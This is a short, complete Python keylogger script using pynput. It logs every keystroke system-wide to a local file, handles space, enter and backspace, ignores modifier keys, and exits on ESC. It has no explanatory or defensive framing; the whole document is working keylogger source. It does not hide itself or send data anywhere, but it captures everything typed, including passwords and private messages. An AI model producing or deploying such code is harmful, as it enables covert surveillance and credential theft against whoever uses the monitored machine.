from pynput.keyboard import Listener
import os

# Define log file path
log_file = os.path.expanduser("log.txt")

def write_to_file(key):
    try:
        letter = str(key).replace("'", "")

        if letter == 'Key.space':
            letter = ' '
        elif letter == 'Key.enter':
            letter = '\n'
        elif letter == 'Key.backspace':
            try:
                with open(log_file, 'r') as f:
                    content = f.read()
                content = content[:-1]  # Remove last character
                with open(log_file, 'w') as f:
                    f.write(content)
            except FileNotFoundError:
                pass  # Ignore if the file does not exist
            return  
        elif letter in ['Key.shift', 'Key.shift_r', 'Key.shift_l', 'Key.ctrl_l', 'Key.ctrl_r', 'Key.alt_l', 'Key.alt_r']:
            return  # Ignore these keys

        # Stop listener when ESC is pressed
        if letter == 'Key.esc':
            print("Exiting keylogger...")
            return False

        with open(log_file, 'a') as f:
            f.write(letter)
    
    except Exception as e:
        print(f"Error: {e}")

# Start key listener
with Listener(on_press=write_to_file) as l:
    l.join()
